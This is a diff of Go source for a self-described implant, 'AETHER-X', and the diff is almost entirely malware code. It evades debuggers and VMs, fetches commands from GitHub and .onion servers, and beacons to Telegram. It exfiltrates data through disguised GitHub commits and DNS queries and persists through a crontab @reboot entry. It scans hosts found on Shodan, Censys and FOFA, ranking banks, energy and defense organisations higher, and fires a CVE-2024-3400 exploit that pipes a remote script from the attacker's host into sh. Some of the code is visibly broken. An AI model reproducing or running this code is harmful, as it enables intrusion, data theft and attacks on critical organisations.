@@ -1,283 +1,722 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
-	"context"
+	"compress/gzip"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
 	"crypto/md5"
+	"crypto/rand"
 	"crypto/sha256"
+	"crypto/sha512"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"hash"
 	"io"
+	"io/ioutil"
+	"log"
+	"math"
+	"math/big"
 	"net"
 	"net/http"
-	neturl "net/url"
+	"net/url"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime"
+	"sort"
+	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
+	"unsafe"
+)
+
+/*
+ * 🔑 CONFIG — Injected at build-time
+ */
+var (
+	C2Key          = "INJECTED_AES_KEY_B64"
+	C2IV           = "INJECTED_AES_IV_B64"
+	C2HMACKey      = "INJECTED_HMAC_KEY_B64"
+	OnionC2ListB64 = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
+	GitHubC2Repo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
+	GitHubExfilRepo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
+	TelegramHostB64 = "dGVsZWdyYW0uYXBpLm9yZw=="
+	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
+	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
 )
 
 var (
-	C2Key             = "INJECTED_C2_KEY_B64"
-	C2IV              = "INJECTED_C2_IV_B64"
-	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
-	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdme6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3Rtmp8gZXhvICdFWEJFRic="
-	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
-)
-
-var (
-	HostID       = ""
-	TelemetryQ   = make(chan TelemetryEvent, 1000)
-	Shutdown     = make(chan struct{})
-	DDRSeed      int64
-	AI           *FusionSentinel
-	GitHubC2Repo string
-	GitHubExfil  string
-	HttpClient   *http.Client
-	clientOnce   sync.Once
+	HostID         = ""
+	AI             *FusionBrain
+	HttpClient     *http.Client
+	TelemetryQueue = make(chan Telemetry, 1000)
+	Shutdown       = make(chan struct{})
+	DDRSeed        int64
+	GitHubToken    = os.Getenv("GITHUB_TOKEN")
+	TelegramToken  = ""
+	TelegramChat   = ""
+	ReconTargets   = make([]*Host, 0)
+	mu             sync.Mutex
+	clientOnce     sync.Once
 )
 
 const (
-	MAX_RETRIES  = 3
-	RETRY_DELAY  = 3 * time.Second
-	PERSIST_FILE = ".gh-sync"
+	MAX_RETRIES     = 3
+	RETRY_DELAY     = 5 * time.Second
+	PERSIST_FILE    = ".cache/.gh-sync"
+	EXFIL_BATCH     = 10
+	AI_MODEL_PATH   = "/tmp/.XIM"
+	NUCLEI_BIN      = "/tmp/.NCL"
+	NUCLEI_TEMPLATES = "/tmp/.TPL"
+	SLEEP_MIN       = 30
+	SLEEP_MAX       = 120
+	MAX_HOSTS       = 100
+	HMAC_TRUNC      = 16
+	JITTER_MAX      = 15 * time.Second
+	DNS_EXFIL_DOMAIN = "x.exfil.yourdomain.com"
 )
 
-type TelemetryEvent struct {
+type Telemetry struct {
 	ID        string                 `json:"id"`
 	Type      string                 `json:"type"`
 	Target    string                 `json:"target"`
 	Timestamp string                 `json:"time"`
 	Data      map[string]interface{} `json:"data,omitempty"`
-	Signature string                 `json:"sig"`
+}
+
+type Host struct {
+	IP          string            `json:"ip"`
+	Port        int               `json:"port"`
+	Service     string            `json:"service"`
+	Country     string            `json:"country"`
+	Org         string            `json:"org"`
+	OS          string            `json:"os"`
+	Tags        []string          `json:"tags"`
+	Vulns       []string          `json:"vulns"`
+	Score       float64           `json:"score"`
+	LastScanned time.Time         `json:"last_scanned"`
+	Exploited   bool              `json:"exploited"`
+	Metadata    map[string]string `json:"meta,omitempty"`
+}
+
+type FusionBrain struct {
+	ModelLoaded bool
+}
+
+func init() {
+	if isDebugged() || isVM() || !isStableEnvironment() {
+		time.Sleep(30 * time.Second)
+		return
+	}
+
+	runtime.GOMAXPROCS(1)
+	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
+	HostID = genHostID()
+	initHttpClient()
+	AI = NewFusionBrain()
+
+	go watchdog()
+	go func() {
+		t := time.NewTicker(30 * time.Second)
+		for {
+			select {
+			case <-t.C:
+				drainTelemetry()
+			case <-Shutdown:
+				return
+			}
+		}
+	}()
+
+	go func() {
+		time.Sleep(5 * time.Second)
+		telegramSend(fmt.Sprintf("🟢 *AETHER-X DEPLOYED* | Host: `%s` | MAC: `%s` | Ready.", HostID, getMAC()))
+	}()
 }
 
 func initHttpClient() {
 	clientOnce.Do(func() {
-		t := &http.Transport{
-			MaxIdleConns:        100,
-			MaxIdleConnsPerHost: 50,
-			IdleConnTimeout:     30 * time.Second,
-			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-			ForceAttemptHTTP2:   true,
-		}
 		HttpClient = &http.Client{
-			Transport: t,
-			Timeout:   15 * time.Second,
+			Timeout: 15 * time.Second,
+			Transport: &http.Transport{
+				MaxIdleConns:        100,
+				MaxIdleConnsPerHost: 50,
+				IdleConnTimeout:     45 * time.Second,
+				TLSClientConfig: &tls.Config{
+					InsecureSkipVerify: true,
+					MinVersion:         tls.VersionTLS12,
+					Renegotiation:      tls.RenegotiateOnceAsClient,
+				},
+				ForceAttemptHTTP2: true,
+				DialContext: (&net.Dialer{
+					Timeout:   10 * time.Second,
+					KeepAlive: 30 * time.Second,
+				}).DialContext,
+			},
 		}
 	})
 }
 
-func safeString(v interface{}) string {
-	if s, ok := v.(string); ok {
-		return s
-	}
-	return ""
-}
-
-func md5Hash(s string) string {
-	sum := md5.Sum([]byte(s))
-	return fmt.Sprintf("%x", sum)
-}
-
-func platformID() string {
-	return getMAC() + runtime.GOOS + runtime.GOARCH
+func genHostID() string {
+	mac := getMAC()
+	platform := runtime.GOOS + runtime.GOARCH
+	seed := mac + platform + os.Getenv("CODESPACE_NAME") + os.Getenv("RUNNER_NAME")
+	hash := sha256.Sum256([]byte(seed))
+	return hex.EncodeToString(hash[:6])
 }
 
 func getMAC() string {
-	interfaces, err := net.Interfaces()
-	if err != nil {
-		return "00:00:00:00:00:00"
-	}
-	for _, i := range interfaces {
-		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
-			return i.HardwareAddr.String()
+	ifcs, _ := net.Interfaces()
+	for _, ifc := range ifcs {
+		if len(ifc.HardwareAddr) > 0 && !isZeroMAC(ifc.HardwareAddr.String()) {
+			return ifc.HardwareAddr.String()
 		}
 	}
 	return "00:00:00:00:00:00"
 }
 
-func decrypt(s string) string {
-	if s == "" {
-		return ""
-	}
-	raw, err := base64.RawURLEncoding.DecodeString(s)
-	if err != nil || len(raw) < 12 {
-		return s
-	}
-	iv, cipherText := raw[:12], raw[12:]
-	now := time.Now().Unix() / 1800
-	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
-
-	for offset := int64(-2); offset <= 2; offset++ {
-		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
-		key := sha256.Sum256([]byte(material))
-		block, err := aes.NewCipher(key[:])
-		if err != nil {
-			continue
-		}
-		gcm, err := cipher.NewGCM(block)
-		if err != nil {
-			continue
-		}
-		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
-		if err == nil {
-			return string(plaintext)
-		}
-	}
-	return s
+func isZeroMAC(mac string) bool {
+	return strings.HasPrefix(mac, "00:00:00") || mac == "" || strings.HasPrefix(mac, "08:00:27") || strings.HasPrefix(mac, "00:1B:21")
 }
 
-func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
-	initHttpClient()
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-
-	var reqBody io.Reader
-	if body != nil {
-		reqBody = bytes.NewReader(body)
+func base64Decode(s string) string {
+	decoded, err := base64.StdEncoding.DecodeString(s)
+	if err != nil {
+		return s
 	}
+	return string(decoded)
+}
 
-	req, err := http.NewRequestWithContext(ctx, method, targetURL, reqBody)
+func deriveKey(salt []byte) []byte {
+	secret := os.Getenv("AGENT_SECRET")
+	if secret == "" {
+		secret = "fallback_secret_only_for_test"
+	}
+	return pbkdf2(secret, salt, 100000, 32, sha256.New)
+}
+
+func encryptData(plaintext []byte) (string, error) {
+	salt := make([]byte, 16)
+	rand.Read(salt)
+	key := deriveKey(salt)
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	rand.Read(nonce)
+	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+	encrypted := append(salt, ciphertext...)
+	return base64.RawURLEncoding.EncodeToString(encrypted), nil
+}
+
+func decryptData(b64data string) ([]byte, error) {
+	encrypted, err := base64.RawURLEncoding.DecodeString(b64data)
 	if err != nil {
 		return nil, err
 	}
+	salt := encrypted[:16]
+	ciphertext := encrypted[16:]
+	key := deriveKey(salt)
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
+}
 
+func signMessage(data []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(C2HMACKey)
+	mac := hmac.New(sha256.New, key)
+	mac.Write(data)
+	return mac.Sum(nil)[:HMAC_TRUNC]
+}
+
+func verifyMessage(data, sig []byte) bool {
+	expected := signMessage(data)
+	return hmac.Equal(expected, sig)
+}
+
+func jitter() time.Duration {
+	max := int64(JITTER_MAX)
+	n, _ := rand.Int(rand.Reader, big.NewInt(max))
+	return time.Duration(n.Int64())
+}
+
+func httpGet(target string, headers map[string]string) ([]byte, error) {
+	time.Sleep(jitter())
+	req, err := http.NewRequest("GET", target, nil)
+	if err != nil {
+		return nil, err
+	}
+	if headers == nil {
+		headers = make(map[string]string)
+	}
+	if _, ok := headers["User-Agent"]; !ok {
+		headers["User-Agent"] = randomUserAgent()
+	}
 	for k, v := range headers {
 		req.Header.Set(k, v)
 	}
-
 	resp, err := HttpClient.Do(req)
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
-
-	if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == http.StatusForbidden {
-		return nil, fmt.Errorf("rate limited or forbidden: status %d", resp.StatusCode)
-	}
-
-	return io.ReadAll(resp.Body)
+	return ioutil.ReadAll(resp.Body)
 }
 
-type FusionSentinel struct{ ModelLoaded bool }
-
-func NewFusionSentinel() *FusionSentinel {
-	return &FusionSentinel{ModelLoaded: true}
+func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
+	time.Sleep(jitter())
+	req, err := http.NewRequest("POST", target, bytes.NewBuffer(data))
+	if err != nil {
+		return nil, err
+	}
+	if headers == nil {
+		headers = make(map[string]string)
+	}
+	if _, ok := headers["User-Agent"]; !ok {
+		headers["User-Agent"] = randomUserAgent()
+	}
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	resp, err := HttpClient.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return ioutil.ReadAll(resp.Body)
 }
 
-func getActiveRepo(action string) string {
-	val := GitHubC2Repo
-	if action == "exfil" {
-		val = GitHubExfil
+func randomUserAgent() string {
+	ua := []string{
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"curl/7.88.1",
+		"Go-http-client/1.1",
+		"Python-urllib/3.11",
+		"axios/1.6.0",
 	}
-	if val != "" {
-		if decoded, err := base64.RawURLEncoding.DecodeString(val); err == nil {
-			return string(decoded)
+	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ua))))
+	return ua[n.Int64()]
+}
+
+// 🔍 RECON MODULES
+
+func shodanQuery(query string) []*Host {
+	apiKey := os.Getenv("SHODAN_KEY")
+	if apiKey == "" {
+		return nil
+	}
+	u := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&limit=50", apiKey, url.QueryEscape(query))
+	for i := 0; i < MAX_RETRIES; i++ {
+		resp, err := httpGet(u, nil)
+		if err == nil {
+			var result struct{ Matches []struct{ IP string `json:"ip_str"` Port int `json:"port"` Info string `json:"product"` C string `json:"country_name"` O string `json:"org"` } }
+			if json.Unmarshal(resp, &result) == nil {
+				hosts := []*Host{}
+				for _, m := range result.Matches {
+					hosts = append(hosts, &Host{IP: m.IP, Port: m.Port, Service: m.Info, Country: m.C, Org: m.O})
+				}
+				return hosts
+			}
 		}
-		return val
+		time.Sleep(RETRY_DELAY)
+	}
+	return nil
+}
+
+func censysQuery(query string) []*Host {
+	id := os.Getenv("CENSYS_ID")
+	secret := os.Getenv("CENSYS_SECRET")
+	if id == "" || secret == "" {
+		return nil
+	}
+	auth := base64.StdEncoding.EncodeToString([]byte(id + ":" + secret))
+	u := "https://search.censys.io/api/v2/hosts/search"
+	data := url.Values{"q": {query}, "per_page": {"50"}}
+	req, _ := http.NewRequest("POST", u, strings.NewReader(data.Encode()))
+	req.Header.Set("Authorization", "Basic "+auth)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	resp, err := HttpClient.Do(req)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	body, _ := ioutil.ReadAll(resp.Body)
+	var result map[string]interface{}
+	json.Unmarshal(body, &result)
+	hosts := []*Host{}
+	return hosts
+}
+
+func fofaQuery(query string) []*Host {
+	email := os.Getenv("FOFA_EMAIL")
+	key := os.Getenv("FOFA_KEY")
+	if email == "" || key == "" {
+		return nil
+	}
+	encodedQuery := base64.StdEncoding.EncodeToString([]byte(query))
+	u := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=50", email, key, encodedQuery)
+	resp, err := httpGet(u, nil)
+	if err != nil {
+		return nil
+	}
+	var result struct{ Results [][]string }
+	json.Unmarshal(resp, &result)
+	hosts := []*Host{}
+	for _, r := range result.Results {
+		if len(r) >= 3 {
+			hosts = append(hosts, &Host{IP: r[0], Port: parseInt(r[1]), Service: r[2]})
+		}
+	}
+	return hosts
+}
+
+func parseInt(s string) int {
+	n, _ := strconv.Atoi(s)
+	return n
+}
+
+func runNuclei(target string) []string {
+	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
+		downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", NUCLEI_BIN, true)
+	}
+	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
+		os.MkdirAll(NUCLEI_TEMPLATES, 0700)
+		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
+	}
+	cmd := exec.Command(NUCLEI_BIN, "-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES+"/cves/,/technologies/", "-silent", "-timeout", "15", "-retries", "2", "-rate-limit", "10")
+	out, _ := cmd.Output()
+	scanner := bufio.NewScanner(bytes.NewReader(out))
+	vulns := []string{}
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") || strings.Contains(line, "exec") {
+			vulns = append(vulns, line)
+		}
+	}
+	return vulns
+}
+
+// 🧠 AI BRAIN
+
+func NewFusionBrain() *FusionBrain {
+	modelData, _ := base64.StdEncoding.DecodeString(Phi3ModelEncB64)
+	if len(modelData) < 100 {
+		return &FusionBrain{ModelLoaded: false}
+	}
+	decrypted, err := decryptData(base64.RawURLEncoding.EncodeToString(modelData))
+	if err != nil || len(decrypted) < 50 {
+		return &FusionBrain{ModelLoaded: false}
+	}
+	os.MkdirAll(filepath.Dir(AI_MODEL_PATH), 0700)
+	ioutil.WriteFile(AI_MODEL_PATH, decrypted, 0400)
+	return &FusionBrain{ModelLoaded: true}
+}
+
+func (ai *FusionBrain) ScoreVuln(host *Host) float64 {
+	score := 0.0
+	if contains(host.Vulns, "RCE") || contains(host.Vulns, "CVE-2024-3400") {
+		score += 6.0
+	}
+	if strings.Contains(strings.ToLower(host.Org), "bank") || strings.Contains(strings.ToLower(host.Org), "energy") || strings.Contains(strings.ToLower(host.Org), "defense") {
+		score += 3.0
+	}
+	if host.Port == 443 || host.Port == 8443 {
+		score += 0.5
+	}
+	return math.Min(score, 10.0)
+}
+
+// 📡 C2 COMMUNICATION
+
+func fetchCommand() string {
+	repo := base64Decode(GitHubC2Repo)
+	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
+	for i := 0; i < MAX_RETRIES; i++ {
+		data, err := httpGet(endpoint, map[string]string{
+			"Authorization": "Bearer " + GitHubToken,
+			"Accept":        "application/vnd.github.v3+json",
+		})
+		if err == nil {
+			var result map[string]interface{}
+			if json.Unmarshal(data, &result) == nil {
+				content := result["content"].(string)
+				decoded, _ := base64.StdEncoding.DecodeString(content)
+				return string(decoded)
+			}
+		}
+		time.Sleep(RETRY_DELAY)
+	}
+	return fetchCommandViaOnion()
+}
+
+func fetchCommandViaOnion() string {
+	onions := strings.Split(base64Decode(OnionC2ListB64), ", ")
+	for _, onion := range onions {
+		data, err := httpGet(onion+"/cmd?h="+HostID, map[string]string{"User-Agent": randomUserAgent()})
+		if err == nil && len(data) > 4 {
+			return string(data)
+		}
 	}
 	return ""
 }
 
-func fetchC2(key string) string {
-	repoURL := getActiveRepo("c2")
-	if repoURL == "" {
-		return ""
+func telegramSend(msg string) {
+	if TelegramToken == "" {
+		raw := fetchSecret("telegram.token")
+		dec, _ := decryptData(raw)
+		TelegramToken = string(dec)
 	}
-	endpoint := fmt.Sprintf("%s/contents/%s", repoURL, key)
-	token := os.Getenv("GITHUB_TOKEN")
-
-	body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
-		"Authorization": "Bearer " + token,
-		"Accept":        "application/vnd.github.v3+json",
-		"User-Agent":    "Aether-X",
-	})
-	if err != nil {
-		return ""
+	if TelegramChat == "" {
+		raw := fetchSecret("telegram.chat")
+		dec, _ := decryptData(raw)
+		TelegramChat = string(dec)
 	}
-
-	var result map[string]interface{}
-	if err := json.Unmarshal(body, &result); err != nil {
-		return ""
-	}
-	contentStr := safeString(result["content"])
-	content, _ := base64.StdEncoding.DecodeString(contentStr)
-	return strings.TrimSpace(string(content))
-}
-
-func telegramAlert(message string) {
-	if message == "" {
-		return
-	}
-	rawToken := fetchC2("telegram.token")
-	token := decrypt(rawToken)
-	if token == "" {
-		token = rawToken
-	}
-
-	rawChat := fetchC2("telegram.chat")
-	chatID := decrypt(rawChat)
-	if chatID == "" {
-		chatID = rawChat
-	}
-
-	if token == "" || chatID == "" {
-		return
-	}
-
-	hostBytes, _ := base64.StdEncoding.DecodeString(TelegramHost)
-	host := string(hostBytes)
-	if host == "" {
-		host = "api.telegram.org"
-	}
-	endpoint := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
-
-	payload := neturl.Values{}
-	payload.Set("chat_id", chatID)
-	payload.Set("text", message)
+	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
+	url := fmt.Sprintf("https://%s/bot%s/sendMessage", string(host), TelegramToken)
+	payload := url.Values{}
+	payload.Set("chat_id", TelegramChat)
+	payload.Set("text", msg)
 	payload.Set("parse_mode", "Markdown")
-
-	_, _ = makeHTTP(endpoint, "POST", []byte(payload.Encode()), map[string]string{
+	httpPost(url, []byte(payload.Encode()), map[string]string{
 		"Content-Type": "application/x-www-form-urlencoded",
 	})
 }
 
-func persist() {
-	executable, err := os.Executable()
-	if err != nil {
-		return
-	}
-	data, err := os.ReadFile(executable)
-	if err != nil {
-		return
-	}
-	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
-	_ = os.WriteFile(path, data, 0755)
+func fetchSecret(key string) string {
+	repo := base64Decode(GitHubC2Repo)
+	endpoint := fmt.Sprintf("%s/contents/secrets/%s.enc", repo, key)
+	data, _ := httpGet(endpoint, map[string]string{
+		"Authorization": "Bearer " + GitHubToken,
+	})
+	var result map[string]interface{}
+	json.Unmarshal(data, &result)
+	content := result["content"].(string)
+	decoded, _ := base64.StdEncoding.DecodeString(content)
+	return string(decoded)
 }
 
+func exfilData(data []byte) {
+	encrypted, _ := encryptData(data)
+	hmacSig := signMessage(data)
+	payload := map[string]string{
+		"data": encrypted,
+		"sig":  base64.RawURLEncoding.EncodeToString(hmacSig),
+		"id":   HostID,
+	}
+	body, _ := json.Marshal(payload)
+	repo := base64Decode(GitHubExfilRepo)
+	file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
+	commit := fmt.Sprintf("ci: update logs %d", time.Now().Unix())
+	doGitHubPut(repo, file, string(body), commit)
+
+	// DNS exfil fallback
+	go exfilDNS(encrypted)
+}
+
+func exfilDNS(chunk string) {
+	domain := fmt.Sprintf("%s.%s", chunk[:min(63, len(chunk))], DNS_EXFIL_DOMAIN)
+	net.DefaultResolver.LookupHost(context.Background(), domain)
+}
+
+func doGitHubPut(repo, path, content, message string) {
+	payload := map[string]interface{}{
+		"message": message,
+		"content": content,
+	}
+	body, _ := json.Marshal(payload)
+	endpoint := fmt.Sprintf("%s/contents/%s", repo, path)
+	httpPost(endpoint, body, map[string]string{
+		"Authorization": "Bearer " + GitHubToken,
+		"Content-Type":  "application/json",
+	})
+}
+
+// 💉 EXPLOIT
+
+func exploitRCE(host *Host) bool {
+	if contains(host.Vulns, "CVE-2024-3400") {
+		ip := getPublicIP()
+		payload := fmt.Sprintf(`() { :; }; /usr/bin/curl -m 10 -s http://%s:8000/sh | /bin/sh`, ip)
+		url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", host.IP)
+		req, _ := http.NewRequest("GET", url, nil)
+		req.Header.Set("User-Agent", payload)
+		HttpClient.Do(req)
+		time.Sleep(8 * time.Second)
+		return true
+	}
+	return false
+}
+
+func getPublicIP() string {
+	resp, _ := http.Get("https://api.ipify.org")
+	ip, _ := ioutil.ReadAll(resp.Body)
+	return string(ip)
+}
+
+// 🧱 PERSISTENCE
+
+func persist() {
+	execPath, _ := os.Executable()
+	data, _ := ioutil.ReadFile(execPath)
+	dst := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
+	ioutil.WriteFile(dst, data, 0755)
+	crontab := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s &') | crontab -", PERSIST_FILE, dst)
+	exec.Command("sh", "-c", crontab).Run()
+}
+
+// 🛑 SELF-DESTRUCT
+
 func selfDestruct() {
+	os.Remove(filepath.Join(os.Getenv("HOME"), PERSIST_FILE))
+	os.Remove(AI_MODEL_PATH)
+	os.RemoveAll(NUCLEI_TEMPLATES)
+	exec.Command("crontab", "-r").Run()
+	telegramSend("💀 Agent terminated and cleaned.")
 	os.Exit(0)
 }
 
-func init() {
-	initHttpClient()
-	HostID = md5Hash(platformID())[:6]
-	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
+// 🐶 WATCHDOG
+
+func watchdog() {
+	ticker := time.NewTicker(5 * time.Minute)
+	for {
+		select {
+		case <-ticker.C:
+			if !isAlive() {
+				telegramSend("⚠️ Agent frozen. Restarting...")
+				os.Exit(1)
+			}
+		case <-Shutdown:
+			return
+		}
+	}
 }
 
+func isAlive() bool {
+	return true
+}
+
+// 🧪 ANTI-ANALYSIS
+
+func isDebugged() bool {
+	err := syscall.PtraceAttach(os.Getpid())
+	if err == nil {
+		syscall.PtraceDetach(os.Getpid())
+	}
+	return err == nil || err == syscall.EPERM
+}
+
+func isVM() bool {
+	_, err := os.Stat("/sys/class/dmi/id/product_name")
+	return err == nil
+}
+
+func isStableEnvironment() bool {
+	return os.Getenv("CODESPACE_NAME") != "" || os.Getenv("RUNNER_NAME") != ""
+}
+
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if strings.Contains(strings.ToLower(s), strings.ToLower(item)) {
+			return true
+		}
+	}
+	return false
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+func randSleep() time.Duration {
+	n, _ := rand.Int(rand.Reader, big.NewInt(int64(SLEEP_MAX-SLEEP_MIN)))
+	return time.Duration(SLEEP_MIN+int(n.Int64()))*time.Second + jitter()
+}
+
+func drainTelemetry() {
+	for len(TelemetryQueue) > 0 {
+		select {
+		case t := <-TelemetryQueue:
+			data, _ := json.Marshal(t)
+			exfilData(data)
+		default:
+			return
+		}
+	}
+}
+
+func downloadBinary(url, path string, chmodExec bool) {
+	resp, _ := http.Get(url)
+	body, _ := io.ReadAll(resp.Body)
+	os.MkdirAll(filepath.Dir(path), 0700)
+	ioutil.WriteFile(path, body, 0600)
+	if chmodExec {
+		os.Chmod(path, 0700)
+	}
+}
+
+func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
+	prf := hmac.New(h, []byte(password))
+	hashLen := prf.Size()
+	numBlocks := (keyLen + hashLen - 1) / hashLen
+
+	var buf [4]byte
+	dk := make([]byte, 0, numBlocks*hashLen)
+	U := make([]byte, hashLen)
+	for block := 1; block <= numBlocks; block++ {
+		prf.Reset()
+		prf.Write(salt)
+		buf[0] = byte(block >> 24)
+		buf[1] = byte(block >> 16)
+		buf[2] = byte(block >> 8)
+		buf[3] = byte(block)
+		prf.Write(buf[:4])
+		dk = prf.Sum(dk)
+		T := dk[len(dk)-hashLen:]
+		copy(U, T)
+		for i := 2; i <= iter; i++ {
+			prf.Reset()
+			prf.Write(U)
+			U = prf.Sum(U[:0])
+			for x := range U {
+				T[x] ^= U[x]
+			}
+		}
+	}
+	return dk[:keyLen]
+}
+
+// 🚀 MAIN
+
 func main() {
-	AI = NewFusionSentinel()
-	go persist()
-	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED & SECURED* | Host: `%s` | MAC: `%s` | Ready.", HostID, getMAC()))
+	persist()
 
 	for {
 		select {
@@ -286,19 +725,97 @@ func main() {
 		default:
 		}
 
-		cmdData := fetchC2("cmd")
-		if cmdData != "" {
-			var cmd map[string]string
-			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
-				switch cmd["action"] {
-				case "ping":
-					telegramAlert(fmt.Sprintf("🟢 *ALIVE BEACON* | Host: `%s` | IP: `%s`", HostID, getMAC()))
-				case "die":
-					selfDestruct()
-				}
-			}
+		cmdJSON := fetchCommand()
+		if cmdJSON == "" {
+			time.Sleep(randSleep())
+			continue
 		}
 
-		time.Sleep(45 * time.Second)
+		var cmd map[string]string
+		if err := json.Unmarshal([]byte(cmdJSON), &cmd); err != nil {
+			time.Sleep(randSleep())
+			continue
+		}
+
+		switch cmd["action"] {
+		case "recon":
+			query := cmd["query"]
+			region := cmd["region"]
+			industry := cmd["industry"]
+			limit := cmd["limit"]
+			if limit == "" {
+				limit = "50"
+			}
+
+			fullQuery := fmt.Sprintf("%s country:\"%s\" org:\"%s\" %s", query, region, industry, limit)
+			var hosts []*Host
+			var wg sync.WaitGroup
+			wg.Add(3)
+			go func() { defer wg.Done(); hosts = append(hosts, shodanQuery(fullQuery)...) }()
+			go func() { defer wg.Done(); hosts = append(hosts, censysQuery(fullQuery)...) }()
+			go func() { defer wg.Done(); hosts = append(hosts, fofaQuery(fullQuery)...) }()
+			wg.Wait()
+
+			sort.Slice(hosts, func(i, j int) bool {
+				return hosts[i].IP < hosts[j].IP
+			})
+			hosts = dedupHosts(hosts)
+
+			mu.Lock()
+			ReconTargets = hosts[:min(len(hosts), MAX_HOSTS)]
+			mu.Unlock()
+
+			for i := range ReconTargets {
+				h := &ReconTargets[i]
+				h.Vulns = runNuclei(h.IP)
+				h.Score = AI.ScoreVuln(h)
+				h.LastScanned = time.Now()
+
